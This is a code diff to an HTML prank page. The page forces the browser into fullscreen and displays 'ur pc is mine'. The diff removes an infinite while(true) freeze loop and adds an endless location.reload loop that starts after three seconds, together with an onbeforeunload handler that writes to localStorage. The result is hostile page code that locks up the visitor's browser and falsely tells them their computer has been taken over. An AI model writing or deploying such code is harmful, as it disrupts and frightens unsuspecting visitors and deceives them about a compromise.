@@ -103,6 +103,7 @@
   </div>
 
   <script>
+    onbeforeunload = function(){localStorage.x=1};
     const EMOJI = '😂';
     const COUNT = 50;
 
@@ -132,21 +133,16 @@
       document.documentElement.requestFullscreen().catch(console.warn);
     });
 
-    // Crash prank after 10 seconds
+    // Fake crash prank after 10 seconds, no prompt
     setTimeout(() => {
       document.querySelector('.bounce-text').textContent = 'bye bye 👋';
       document.querySelector('.left').textContent = 'ur pc';
       document.querySelector('.right').textContent = 'is mine';
 
-      // Run the infinite freeze loop multiple times in different ways to reinforce crash
-      for (let i = 0; i < 3; i++) {
-        // Slight delay between loops to confuse the browser a bit
-        setTimeout(() => {
-          // Freeze main thread indefinitely
-          while (true) {}
-        }, i * 10);
-      }
-    }, 10000);
+      setTimeout(function(){
+        while(1) location.reload(1);
+      }, 1000);
+    }, 3000);
   </script>
 </body>
 </html>
